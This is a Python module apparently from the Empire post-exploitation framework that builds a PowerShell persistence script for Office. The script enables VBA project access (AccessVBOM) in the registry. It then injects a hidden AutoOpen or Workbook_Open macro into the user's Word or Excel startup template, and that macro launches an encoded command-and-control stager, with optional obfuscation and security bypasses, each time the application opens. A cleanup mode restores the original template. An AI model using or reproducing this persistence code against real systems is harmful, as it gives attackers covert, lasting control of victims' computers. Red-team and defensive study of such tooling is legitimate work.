from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule

_BACKUP_KEY = "HKCU:\\Software\\Empire\\OfficeMacroBackup"


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        listener_name = params["Listener"]
        language = params["Language"]
        target_app = params["TargetApp"]
        cleanup = params["Cleanup"]
        obf = params["Obfuscate"].lower() == "true"
        obf_cmd = params["ObfuscateCommand"]
        bypasses = params["Bypasses"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        if target_app.lower() not in ("word", "excel"):
            raise ModuleValidationException(
                f"[!] Invalid TargetApp '{target_app}'. Must be 'word' or 'excel'."
            )

        if target_app.lower() == "word":
            template_file = "$env:APPDATA\\Microsoft\\Templates\\Normal.dotm"
            backup_file = "$env:APPDATA\\Microsoft\\Templates\\Normal.dotm.bak"
            security_sub_key = "Word\\Security"
        else:
            template_file = "$env:APPDATA\\Microsoft\\Excel\\XLSTART\\Personal.xlsb"
            backup_file = "$env:APPDATA\\Microsoft\\Excel\\XLSTART\\Personal.xlsb.bak"
            security_sub_key = "Excel\\Security"

        if cleanup.lower() == "true":
            script = (
                '$templateFile = "' + template_file + '";\n'
                '$backupFile = "' + backup_file + '";\n'
                "$backupKey = '" + _BACKUP_KEY + "';\n"
                # Restore template file
                "if (Test-Path $backupFile) {\n"
                "    try {\n"
                "        Remove-Item -Path $templateFile -Force -ErrorAction Stop;\n"
                "        Rename-Item -Path $backupFile -NewName (Split-Path $templateFile -Leaf) -Force -ErrorAction Stop;\n"
                "        Write-Output '[+] Restored original template from backup.';\n"
                "    } catch {\n"
                '        Write-Output "[-] Failed to restore template: $_";\n'
                "    }\n"
                "} else {\n"
                "    Write-Output '[!] No template backup file found.';\n"
                "}\n"
                # Restore AccessVBOM
                "if (Test-Path $backupKey) {\n"
                "    $backup = Get-ItemProperty -Path $backupKey;\n"
                "    $regPath = $backup.RegPath;\n"
                "    if ($backup.PSObject.Properties.Name -contains 'AccessVBOM') {\n"
                "        Set-ItemProperty -Path $regPath -Name 'AccessVBOM' -Value $backup.AccessVBOM -Type DWord;\n"
                "    } else {\n"
                "        Remove-ItemProperty -Path $regPath -Name 'AccessVBOM' -ErrorAction SilentlyContinue;\n"
                "    }\n"
                "    Remove-Item -Path $backupKey -Recurse -Force;\n"
                "    Write-Output '[+] Restored AccessVBOM registry value.';\n"
                "} else {\n"
                "    Write-Output '[!] No AccessVBOM backup found.';\n"
                "}"
            )

            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if not listener_name:
            raise ModuleValidationException("Listener is required.")

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        lang = language.lower()
        try:
            if lang == "powershell":
                launcher = main_menu.stagergenv2.generate_launcher(
                    listener_name=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    user_agent=user_agent,
                    proxy=proxy,
                    proxy_creds=proxy_creds,
                    bypasses=bypasses,
                )
            elif lang in ("csharp", "ironpython"):
                launcher = main_menu.stagergenv2.generate_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            elif lang == "go":
                launcher = main_menu.stagergenv2.generate_go_exe_oneliner(
                    language=lang,
                    obfuscate=obf,
                    obfuscation_command=obf_cmd,
                    encode=True,
                    listener_name=listener_name,
                )
            else:
                raise ModuleValidationException(f"Language '{language}' not supported.")
        except ModuleValidationException:
            raise
        except Exception as e:
            raise ModuleValidationException(
                f"[!] Launcher generation failed for {language}: {e}"
            ) from e

        if not launcher or not launcher.strip():
            raise ModuleValidationException("[!] Error in launcher command generation.")

        # Escape launcher once for VBA string ("" in VBA) and once for PS single-quoted string ('').
        vba_launcher = launcher.replace('"', '""')
        if target_app.lower() == "word":
            vba_block = f'Sub AutoOpen()\n    Shell "{vba_launcher}", vbHide\nEnd Sub'
            com_app = "Word.Application"
        else:
            vba_block = (
                f'Sub Workbook_Open()\n    Shell "{vba_launcher}", vbHide\nEnd Sub'
            )
            com_app = "Excel.Application"
        vba_escaped = vba_block.replace("'", "''")

        script = (
            '$templateFile = "' + template_file + '";\n'
            '$backupFile = "' + backup_file + '";\n'
            "$backupKey = '" + _BACKUP_KEY + "';\n"
            # Pick the first registered Office version and back up AccessVBOM before changing it
            "$officeVersions = @('16.0', '15.0', '14.0', '12.0');\n"
            "$regPath = $null;\n"
            "foreach ($ver in $officeVersions) {\n"
            '    $candidate = "HKCU:\\Software\\Microsoft\\Office\\$ver\\'
            + security_sub_key
            + '";\n'
            "    if (Test-Path $candidate) { $regPath = $candidate; break }\n"
            "};\n"
            "if (-not $regPath) {\n"
            "    $regPath = 'HKCU:\\Software\\Microsoft\\Office\\16.0\\"
            + security_sub_key
            + "';\n"
            "    New-Item -Path $regPath -Force | Out-Null;\n"
            "}\n"
            "try {\n"
            "    New-Item -Path $backupKey -Force -ErrorAction Stop | Out-Null;\n"
            "    Set-ItemProperty -Path $backupKey -Name 'RegPath' -Value $regPath -ErrorAction Stop;\n"
            "    $existing = Get-ItemProperty -Path $regPath -Name 'AccessVBOM' -ErrorAction SilentlyContinue;\n"
            "    if ($existing) {\n"
            "        Set-ItemProperty -Path $backupKey -Name 'AccessVBOM' -Value $existing.AccessVBOM -Type DWord -ErrorAction Stop;\n"
            "    }\n"
            "    Set-ItemProperty -Path $regPath -Name 'AccessVBOM' -Value 1 -Type DWord -Force -ErrorAction Stop;\n"
            "} catch {\n"
            '    Write-Output "[-] Failed to enable AccessVBOM: $_";\n'
            "    Remove-Item -Path $backupKey -Recurse -Force -ErrorAction SilentlyContinue;\n"
            "    return;\n"
            "};\n"
            'Write-Output "[*] Enabled VBA project access at $regPath";\n'
            # Back up template file
            "if (Test-Path $templateFile) {\n"
            "    Copy-Item -Path $templateFile -Destination $backupFile -Force;\n"
            "    Write-Output '[*] Backed up template';\n"
            "};\n"
            "$targetDir = Split-Path $templateFile -Parent;\n"
            "if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory -Force | Out-Null };\n"
            # COM inject
            "$macroCode = '" + vba_escaped + "';\n"
            "$app = $null;\n"
            "$doc = $null;\n"
            "$wb = $null;\n"
            "$injected = $false;\n"
            "try {\n"
            "    $app = New-Object -ComObject '" + com_app + "';\n"
            "    $app.Visible = $false;\n"
            "    $app.DisplayAlerts = $false;\n"
        )

        if target_app.lower() == "word":
            script += (
                "    if (Test-Path $templateFile) { $doc = $app.Documents.Open($templateFile) }\n"
                "    else { $doc = $app.Documents.Add() };\n"
                "    $vbaProject = $doc.VBProject;\n"
                "    $newModule = $vbaProject.VBComponents.Add(1);\n"
                "    $newModule.CodeModule.AddFromString($macroCode);\n"
                # wdFormatXMLTemplateMacroEnabled = 15 -- without this a fresh doc saves as .docx and strips VBA
                "    $doc.SaveAs([ref]$templateFile, [ref]15);\n"
                "    $doc.Close($false);\n"
                "    $doc = $null;\n"
            )
        else:
            script += (
                # Excel: Workbook_Open only fires from inside the ThisWorkbook document-class module,
                # so we must add to that module rather than a new standard module (VBComponents.Add(1)).
                "    if (Test-Path $templateFile) { $wb = $app.Workbooks.Open($templateFile) }\n"
                "    else { $wb = $app.Workbooks.Add() };\n"
                "    $vbaProject = $wb.VBProject;\n"
                "    $thisWorkbook = $vbaProject.VBComponents.Item('ThisWorkbook');\n"
                "    $thisWorkbook.CodeModule.AddFromString($macroCode);\n"
                # xlOpenXMLAddIn is not a template; xlExcel12 (50) is macro-enabled binary workbook (.xlsb)
                "    $wb.SaveAs($templateFile, 50);\n"
                "    $wb.Close($false);\n"
                "    $wb = $null;\n"
            )

        script += (
            "    $injected = $true;\n"
            "} catch {\n"
            '    Write-Output "[!] Error injecting macro: $_";\n'
            "} finally {\n"
            # Release whatever managed to get created, in reverse order
            "    if ($doc) {\n"
            '        try { $doc.Close($false) } catch { Write-Output "[!] doc.Close failed: $_" }\n'
            "        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc) | Out-Null;\n"
            "    }\n"
            "    if ($wb) {\n"
            '        try { $wb.Close($false) } catch { Write-Output "[!] wb.Close failed: $_" }\n'
            "        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($wb) | Out-Null;\n"
            "    }\n"
            "    if ($app) {\n"
            '        try { $app.Quit() } catch { Write-Output "[!] app.Quit failed: $_" }\n'
            "        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app) | Out-Null;\n"
            "    }\n"
            "    [GC]::Collect(); [GC]::WaitForPendingFinalizers();\n"
            "}\n"
            "if ($injected) {\n"
            '    Write-Output "[+] Macro injected into $templateFile";\n'
            "    Write-Output '[+] Macro will execute each time "
            + target_app
            + " is opened.';\n"
            "} else {\n"
            # Rollback: restore AccessVBOM + the template file if we had one backed up
            "    if (Test-Path $backupKey) {\n"
            "        $backup = Get-ItemProperty -Path $backupKey;\n"
            "        if ($backup.PSObject.Properties.Name -contains 'AccessVBOM') {\n"
            "            Set-ItemProperty -Path $regPath -Name 'AccessVBOM' -Value $backup.AccessVBOM -Type DWord;\n"
            "        } else {\n"
            "            Remove-ItemProperty -Path $regPath -Name 'AccessVBOM' -ErrorAction SilentlyContinue;\n"
            "        }\n"
            "        Remove-Item -Path $backupKey -Recurse -Force;\n"
            "    }\n"
            "    if (Test-Path $backupFile) {\n"
            "        try {\n"
            "            Copy-Item -Path $backupFile -Destination $templateFile -Force -ErrorAction Stop;\n"
            "            Remove-Item -Path $backupFile -Force -ErrorAction SilentlyContinue;\n"
            "            Write-Output '[*] Restored original template from backup.';\n"
            "        } catch {\n"
            '            Write-Output "[-] Template restore failed: $_";\n'
            "        }\n"
            "    }\n"
            "    Write-Output '[-] Macro injection failed; AccessVBOM and template restored.';\n"
            "}"
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
